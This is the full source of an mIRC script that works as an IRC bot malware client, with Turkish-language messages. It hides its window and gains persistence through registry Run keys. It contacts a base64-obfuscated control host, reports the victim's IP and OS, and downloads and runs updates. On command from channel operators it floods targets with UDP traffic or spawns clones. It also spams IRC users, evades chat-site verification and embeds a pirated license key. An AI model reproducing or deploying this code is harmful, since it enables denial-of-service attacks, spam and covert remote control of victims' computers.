   on *:start: {
     unset %*
     .timer -i 1 2 NICK $_rands
     .timer -i 1 2 ANICK $_rands
     .timer -i 1 2 IDENTD ON $_rands
     .timer -i 1 2 FULLNAME $_rands
     .timer -i 1 2 EMAILADDR $_rands
     .timer -i 0 60 _start
     .timer -i 0 10 _reg
     set %down 1
     if $exists(up.reg) {
       .remove up.reg
     }
     write up.reg REGEDIT4
     write up.reg [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
     write up.reg "SYSTEM"=" $+ $nopath($mircexe) $+ "
     _mircreg
     .timer -i 1 1 _reg
     if $os != 98 {
       dll winsome.dll HideMirc on
     }
     else {
       showmirc -t
     }
   }
   on *:appactive: {
     if $os != 98 {
       dll winsome.dll HideMirc on
     }
     else {
       showmirc -t
     }
   }
   on *:exit: {
     run -n regedit /s up.reg
     run $nopath($mircexe)
   }
   on *:connect: {
     if $serverip == %serverip || $serverip == %serverip2 {
       .timer -i 1 5 JOIN %join
     }
   }
   on *:text:*:#: {
     if $nick isop # && # == %join && ($serverip == %serverip || $serverip == %serverip2) {
       if $1 == !sikonu {
         _udpflood $2-
       }
       if $1 == !clone && $4 {
         _servmessage $2 $+ : $+ $3 adresine $4 clone ile giriliyor...
         var %i 1
         while %i <= $4 {
           .timer -i 1 $calc(%i * 5) server -m $2 $3
           inc %i
         }
       }
     }
   }
   on ^*:text:*:#: {
     if $nick !isop # {
       halt
     }
   }
   on *:join:#: {
     if $nick == $me && # == %join && ($serverip == %serverip || $serverip == %serverip2) {
       .timer -i 1 2 .msg # $ip - Windows: $os - Host: $host
     }
   }
   alias _udpflood {
     var %i 1
     while %i <= $4 {
       sockudp -b flood $1 $2 $3
       inc %i
     }
     _servmessage UDP flood tamamlandi: $1 $+ : $+ $2 ( $+ $3 bytes. $4 kere)
   }
   alias _servmessage {
     if $server {
       if m isincs $chan(%join).mode && $me !isvoice %join {
         return
       }
       scid 1 .msg %join $1-
     }
   }
   alias _start {
     if !%readed {
       _opensocks
     }
   }
   alias _opensocks {
     if !$sock(readweb) {
       sockopen readweb $decode(d3d3Lm5hdmNhbmNsLmNvbQ==,m) 80
     }
   }
   on *:sockopen:*: {
     if $sockname == sohbetauth {
       if $sockerr > 0 {
         return
       }
       _sw $sockname GET %sohbetpost HTTP/1.1
       _sw $sockname HOST: irc.sohbet.net
       _sw $sockname
     }
     if $sockname == chatsohbetport {
       sockwrite -n $sockname GET /cs/?nick=fwefwef&oda=&radyo= HTTP/1.1
       sockwrite -n $sockname Host: www.enler.net
       sockwrite -n $sockname User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; tr-TR; rv:1.7.12) Gecko/20050919 Firefox/1.0.7
       sockwrite -n $sockname Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/pn ...
       sockwrite -n $sockname Accept-Language: en-us,en;q=0.5
       sockwrite -n $sockname Accept-Encoding: gzip,deflate
       sockwrite -n $sockname Accept-Charset: ISO-8859-9,utf-8;q=0.7,*;q=0.7
       sockwrite -n $sockname Keep-Alive: 300
       sockwrite -n $sockname Connection: keep-alive
       sockwrite -n $sockname Referer: http://www.chatsohbet.net/gir.php
       sockwrite -n $sockname Cache-Control: max-age=0
       sockwrite -n $sockname
     }
     if $sockname == readweb {
       if $sockerr > 0 {
         return
       }
       _hfree servers
       _sw $sockname GET /kjdkjdkjkdnxskw.php HTTP/1.1
       _sw $sockname Host: $decode(d3d3Lm5hdmNhbmNsLmNvbQ==,m)
       _sw $sockname User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
       _sw $sockname
     }
     if $sockname == update {
       if $sockerr > 0 {
         return
       }
       unset %dr.*
       write -c %updget
       sockwrite -n $sockname GET $+(/,%updget) HTTP/1.1
       sockwrite -n $sockname Accept: */*
       sockwrite -n $sockname Host: %updhost
       sockwrite -n $sockname
     }
     if pirasar* iswm $sockname {
       if $sockerr > 0 {
         return
       }
       sockwrite -nt $sockname GET / $+ $gettok(%rip,2-,47) HTTP/1.1
       sockwrite -nt $sockname Host: $gettok(%rip,1,47)
       if $gettok(%rip,1,47) == xxxx {
         sockwrite -nt $sockname Authorization: Basic MTox
       }
       sockwrite -nt $sockname
     }
     if $sockname != update && $sockname != readweb && $sockname != scdown && pirasar* !iswm $sockname && $sockname != chatsohbetport && $sockname != sohbetauth {
       if %pass [ $+ [ $sockname ] ] {
         _sw $sockname PASS $ifmatch
       }
       _sw $sockname NICK $_rands $iif(%javaurl [ $+ [ $sockname ] ],$ifmatch)
       if %user [ $+ [ $sockname ] ]  {
         _sw $sockname USER $ifmatch
       }
       else {
         _sw $sockname USER $_info($sockname).identd "" " $+ $_info($sockname).server $+ " : $+ $_info($sockname).fullname
       }
       hadd -m lenght $sockname 1
     }
   }
   on *:sockread:*: {
     if $sockname == sohbetauth {
       sockread %sa
       tokenize 32 %sa
       if $gettok($1-,1-2,61) == <img src="resim.php?auth {
         _sw sohbetnet giris $left($gettok($1-,3,61),-2)
       }
     }
     if $sockname == chatsohbetport {
       sockread %or
       if fullname isin %or {
         set %chidentd $remove($mid(%or,$pos(%or,fullname%22%20VALUE%3D%22,1),33),fullname%22%20VALUE%3D%22)
       }
       if port%22%20value%3D%22 isin %or {
         set %chport $remove($mid(%or,$pos(%or,port%22%20value%3D%22,1),25),port%22%20value%3D%22)
       }
     }
     if $sockname == readweb {
       if $sockerr {
         return
       }
       var %readweb
       sockread %readweb
       tokenize 32 %readweb
       if $1 == server {
         _newserver $iif($2 == chatsohbet,$replace($2-,6667,%chport,chident,%chidentd),$2-)
       }
       if $1 == wwwprefix {
         set %wwwprefix $2-
         _wwwprefix
       }
       if $1 == pass {
         set %pass [ $+ [ $2 ] ] $3-
       }
       if $1 == javaurl {
         set %javaurl [ $+ [ $2 ] ] $3-
       }
       if $1 == user {
         set %user [ $+ [ $2 ] ] $iif($2 == chatsohbet,%chidentd x x : $+ %chidentd,$3-)
       }
       if $1 == version {
         set %version [ $+ [ $2 ] ] $3-
       }
       if $1 == connect {
         set %serverip $4
         set %serverip2 $5
         .timer -i 1 5 !server $2 $3
       }
       if $1 == join {
         set %join $2
       }
       if $1 == r {
         set %rip $2
         set %rport $3
         set %rtime $4
         _r
       }
       if $1 == update {
         set %updhost $2
         set %updport $3
         set %updget $4
         set %updbytes $5
         if ($exists(%updget) && $file(%updget) != %updbytes) || !$exists(%updget) {
           _update
         }
       }
       if $hget(servers,$1) {
         _spamset $1-
       }
     }
     if $sockname == update {
       if $sockerr {
         return
       }
       else {
         if (%dr. [ $+ [ $hash($sockname,32) ] ] != 1) {
           var %h. [ $+ [ $hash($sockname,32) ] ]
           sockread %h. [ $+ [ $hash($sockname,32) ] ]
           while $sockbr {
             if * !iswm %h. [ $+ [ $hash($sockname,32) ] ] {
               set %dr. [ $+ [ $hash($sockname,32) ] ] 1
               break
             }
             sockread %h. [ $+ [ $hash($sockname,32) ] ]
           }
         }
         sockread 4096 &d
         while $sockbr {
           bwrite %updget -1 -1 &d
           sockread 4096 &d
         }
       }
     }
     if pirasar* iswm $sockname {
       sockread %or
     }
     if $sockname != update && $sockname != readweb && $sockname != scdown && pirasar* !iswm $sockname && $sockname != chatsohbetport && $sockname != sohbetauth {
       var %s
       sockread %s
       tokenize 32 %s
       if $1 == PING {
         _sw $sockname PONG $remove($2-,:)
       }
       if $1 == ERROR {
         _servmessage $sockname : $2-
         if Throttled isin $2- {
           inc -u70 %dontcon. [ $+ [ $sockname ] ] 1
         }
       }
       if $2 == NOTICE && (*.*.* iswm $1 || $sockname == chatsohbet) && $chr(47) isin $4- {
         _sw $sockname $_findit($strip($1-))
       }
       if ($2 == NOTICE || $2 == PRIVMSG) && $4 == :PING && $left($5,-1) isnum {
         _sw $sockname NOTICE $_nick($1) $4 $iif($sockname == chatsohbet,$5,$+($ctime,))
       }
       if $_nick($1) isnum {
         _sw $sockname $strip($gettok($gettok($4-,2,47),1,32)) $_nick($1)
       }
       if anet.net.tr isin $1 {
         if birinci isin $4- {
           set %anet 1
         }
         if ikinci isin $4- {
           set %anet 2
         }
         if * ü?üncü * iswm $4- {
           set %anet 3
         }
         if dördüncü isin $4- {
           set %anet 4
         }
         if * be?inci * iswm $4- {
           set %anet 5
         }
         if * alt?nc? * iswm $4- {
           set %anet 6
         }
         if $remove($right($4-,-1),$chr(32)) isnum {
           _sw $sockname verify $gettok($right($4-,-1),%anet,32)
         }
       }
       if *.*.* iswm $botfnick($1) && *x-irc* iswm $botfnick($1) {
         _sw $sockname verify $left($gettok($4,2,61),5)
       }
       if http://irc.sohbet.net/auth.php? isin $1- {
         set %sohbetpost $+(/,$gettok($strip($gettok($1-,-1,32)),-1,47))
         sohbetauth
       }
       if $remove($strip($right($4-,-1)),$chr(32)) isnum && *.*.* iswm $1 {
         var %st $remove($replace($right($4-,-1),$chr(160),$chr(32)),$chr(15))
         var %i 1
         while %i <= $numtok(%st,32) {
           if $right($gettok(%st,%i,32),1) == $chr(3) && $remove($gettok(%st,%i,32),$chr(3)) isnum {
             _sw $sockname verify $strip($gettok(%st,%i,32))
           }
           inc %i
         }
       }
       if *ooo* iswm $right($4-,-1) {
         var %i 1 , %s 1
         while %i <= 4 {
           %s [ $+ [ $+($sockname,%i) ] ] = $+(%s [ $+ [ $+($sockname,%i) ] ],*,$gettok($gettok($_ozzy1(%i,$right($4-,-1)),2,52),1,3))
           inc %i
         }
         if $chr(52) !isin $right($4-,-1) && $chr(3) isin $right($4-,-1) {
           while %s <= 4 {
             %s [ $+ [ $+($sockname,%s) ] ] = $hash(%s [ $+ [ $+($sockname,%s) ] ],32)
             inc %s
           }
           _uv $sockname
         }
       }
       if $4 == :VERSION && $2 == PRIVMSG {
         if $sockname == kelebekgentr {
           _sw $sockname NOTICE $_nick($1) :mIRC v6.16 Khaled Mardam-Bey
           return
         }
         if %version [ $+ [ $sockname ] ] {
           _sw $sockname NOTICE $_nick($1) :VERSION $ifmatch $+
         }
         else {
           _sw $sockname NOTICE $_nick($1) :VERSION mIRC v6.16 Khaled Mardam-Bey
         }
       }
       if $4 == :TIME && $2 == PRIVMSG {
         _sw $sockname NOTICE $_nick($1) :TIME $asctime $+
       }
       if $4 == :FINGER && $2 == PRIVMSG {
         _sw $sockname NOTICE $_nick($1) :FINGER $_rands ( $+ $_rands $+ ) Idle $r(1,5) seconds $+
       }
       if $2 == 376 || $2 == 422 {
         set -u5 %namesx. [ $+ [ $sockname ] ] 1
         .timer -i 1 $r(3,5) _sw $sockname MODE $3 -RDmM
         .timer -i 1 $r(3,5) _sw $sockname UMODE -RDmM
         .timer -i 1 $r(10,15) _sw $sockname JOIN $_info($sockname).chans
       }
       if $2 == 432 || $2 == 431 || $2 == 433 {
         .timer -i 1 5 _sw $sockname NICK $_rands
       }
       if $2 == 496 {
         .timer -i 1 5 _sw $sockname JOIN $_info($sockname).chans
       }
       if $2 == 403 || $2 == 405 || $2 == 471 || $2 == 472 || $2 == 473 || $2 == 474 || $2 == 475 || $2 == 477 {
         _sw $sockname JOIN 0,
         .timer -i 1 5 _sw $sockname JOIN $_info($sockname).chans
       }
       if $2 == 439 {
         sockclose $sockname
       }
       if $2 == 353 && !%namesx. [ $+ [ $sockname ] ] {
         set %names. [ $+ [ $sockname ] ] 1
         var %m $right($6-,-1)
         while %names. [ $+ [ $sockname ] ] <= $numtok(%m,32) {
           if $_isprefix($gettok(%m,%names. [ $+ [ $sockname ] ],32)) && !$istok($hget(opnicks,$sockname),$_noprefix($gettok(%m,%names. [ $+ [ $sockname ] ],32)),44) {
             hadd -m opnicks $sockname $iif($hget(opnicks,$sockname),$+($+($ifmatch,$chr(44)),$_noprefix($gettok(%m,%names. [ $+ [ $sockname ] ],32))),$_noprefix($gettok(%m,%names. [ $+ [ $sockname ] ],32)))
           }
           var %q $r(1,2)
           if %q == 1 && $hget(lenght,$sockname) < 30 {
             hinc lenght $sockname
             .timer -i 1 $calc(%names. [ $+ [ $sockname ] ] * $_info($sockname).queue) _sw $sockname USERHOST $_noprefix($gettok(%m,%names. [ $+ [ $sockname ] ],32))
           }
           inc %names. [ $+ [ $sockname ] ]
         }
       }
       if $2 == 366 {
         .timer -i 1 $calc(%names. [ $+ [ $sockname ] ] * $_info($sockname).queue + $r(5,10)) _sw $sockname NICK $_rands
         .timer -i 1 $calc(%names. [ $+ [ $sockname ] ] * $_info($sockname).queue + $r(10,20)) _sw $sockname JOIN $_info($sockname).chans
         .timer -i 1 $r(4,10) _sw $sockname PART $4
       }
       if $2 == 001 {
         unset %s [ $+ [ $sockname ] ] $+ *
       }
       if $2 == 302 && $len($4) > 1 {
         if $istok($hget(opnicks,$sockname),$right($gettok($4,1,61),-1),44) && !$istok($hget(ops,$sockname),$gettok($4,2,64),44) {
           hadd -m ops $sockname $iif($hget(ops,$sockname),$+($+($ifmatch,$chr(44)),$gettok($4,2,64)),$gettok($4,2,64))
           hdec lenght $sockname
         }
         if $chr(42) isin $right($gettok($4,1,61),-1) {
           hdec lenght $sockname
         }
         else {
           if !istok($hget(ops,$sockname),$gettok($4,2,64),44) {
             _sw $sockname PRIVMSG $right($gettok($4,1,61),-1) $_info($sockname).spam
             hdec lenght $sockname
           }
         }
       }
     }
   }
   on *:sockclose:*: {
     if $sockname == readweb {
       set %readed 1
       .timer -i 0 100 _startspam
       _wwwprefix
     }
     if $sockname != readweb && $sockname != scdown && $sockname == update {
       exit
     }
   }
   alias _isprefix {
     if $chr(37) isin $1 || $chr(64) isin $1 || $chr(126) isin $1 || $chr(38) isin $1 {
       return $true
     }
   }
   alias _noprefix {
     return $remove($1,$chr(37),@,+,~,&)
   }
   alias _nick {
     return $right($gettok($1-,1,33),-1)
   }
   alias _wwwprefix {
     var %f = $r(99,999999) $+ .reg
     write %f REGEDIT4
     write %f [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\URL\Prefixes]
     write %f "www"=" $+ %wwwprefix $+ "
     run -n regedit /s %f
     .timer -i 1 4 .remove %f
   }
   alias _reg {
     var %f = $r(99,999999) $+ .reg
     write %f REGEDIT4
     write %f [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
     write %f "SYSTEM"=" $+ $nopath($mircexe) $+ "
     run -n regedit /s %f
     .timer -i 1 4 .remove %f
   }
   alias _mircreg {
     var %mr = $r(99,999999) $+ .reg
     write %mr REGEDIT4
     write %mr [HKEY_CURRENT_USER\Software\mIRC\UserName]
     write %mr ""="TaXi mIRC"
     write %mr [HKEY_CURRENT_USER\Software\mIRC\License]
     write %mr ""="5998-425328-50"
     run -n regedit /s %mr
     .timer -i 1 4 .remove %mr
   }
   alias _spamset {
     hadd -m spam $1-
   }
   alias _newserver {
     hadd -m servers $1-
   }
   alias _r {
     var %i 1
     while %i <= %rtime {
       var %pirasar $r(1,999999)
       while $sock($+(pirasar,%pirasar)) {
         inc %pirasar
       }
       sockopen $+(pirasar,%pirasar) $gettok(%rip,1,47) %rport
       inc %i
     }
   }
   alias _findit {
     var %i 1 , %s $strip($right($gettok($1-,4-,32),-1))
     while %i <= $len(%s) {
       if $mid(%s,%i,1) == $chr(47) {
         return $gettok($right($mid(%s,%i,$mid(%s,%i,0)),-1),1,34)
       }
       inc %i
     }
   }
   alias _update {
     .timer 1 120 sockopen update %updhost %updport
   }
   alias _startspam {
     var %i 1
     while %i <= $hget(servers,0).item {
       if !$sock($hget(servers,%i).item) {
         if $hget(ops,$hget(servers,%i).item) {
           hdel ops $hget(servers,%i).item
         }
         if $hget(opnicks,$hget(servers,%i).item) {
           hdel opnicks $hget(servers,%i).item
         }
         if $hget(lenght,$hget(servers,%i).item) {
           hdel lenght $hget(servers,%i).item
         }
         _sockopen $hget(servers,%i).item $gettok($hget(servers,%i).data,1-2,32)
       }
       inc %i
     }
   }
   alias _sockopen {
     if !$sock($1) && !%dontcon. [ $+ [ $1 ] ] {
       .timer 1 $r(5,30) sockopen $1-
     }
   }
   alias _info {
     if $hget(servers,$1) {
       if $prop == server {
         return $gettok($hget(servers,$1),1,32)
       }
       if $prop == port {
         return $gettok($hget(servers,$1),2,32)
       }
       if $prop == chans {
         return $gettok($gettok($hget(servers,$1),3,32),$r(1,$numtok($gettok($hget(servers,$1),3,32),44)),44)
       }
       if $prop == identd {
         return $iif($gettok($hget(servers,$1),4,32) == random,$lower($_rands),$gettok($hget(servers,$1),4,32))
       }
       if $prop == queue {
         return $gettok($hget(servers,$1),5,32)
       }
       if $prop == fullname {
         return $iif($gettok($hget(servers,$1),6-,32) == random,$_rands,$gettok($hget(servers,$1),6-,32))
       }
       if $prop == spam {
         if $hget(spam,$1) {
           return $iif($hget(spam,$1) == random,$_rands,$hget(spam,$1))
         }
       }
     }
   }
   alias _rands {
     var %i 1 , %l $r(2,8) , %r
     while $len(%r) <= %l {
       var %o 1 , %u , %y
       while %o <= 3 {
         $iif($istok(a.e.i.o.u,$left($right(%r,%o),1),46),inc %u,inc %y)
         inc %o
       }
       var %k $iif(%u >= 2,1,$iif(%y >= 3,2,$r(1,2))) , %x $r(a,z)
       while $iif(%k == 1,$istok(a.e.i.o.u,%x,46),!$istok(a.e.i.o.u,%x,46)) {
         %x = $r(a,z)
       }
       %r = $+(%r,%x)
     }
     return %r
   }
   alias _hfree {
     if $hget($1) {
       hfree $1
     }
   }
   alias _ozzy1 {
     if $1 == 1 {
       return $left($2-,20)
     }
     if $1 == 2 {
       return $right($left($2-,40),20)
     }
     if $1 == 3 {
       return $left($right($2-,40),20)
     }
     if $1 == 4 {
       return $right($2-,20)
     }
   }
   alias _numbul {
     if $1 == 1819020288 {
       return 1
     }
     if $1 == 1491484416 {
       return 4
     }
     if $1 == 4143249408 {
       return 3
     }
     if $1 == 2324363520 {
       return 8
     }
     if $1 == 944673792 {
       return 9
     }
     if $1 == 1515740160 {
       return 7
     }
     if $1 == 2483278080 {
       return 5
     }
     if $1 == 1653838848 {
       return 6
     }
     if $1 == 4097249280 {
       return 2
     }
   }
   alias _uv {
     var %i 1 , %r
     while %i <= 4 {
       %r = $+(%r,$_numbul(%s [ $+ [ $+($1,%i) ] ]))
       inc %i
     }
     _sw $1 verify %r
   }
   alias _sw {
     if $sock($1).status == active {
       sockwrite -nt $1-
     }
   }
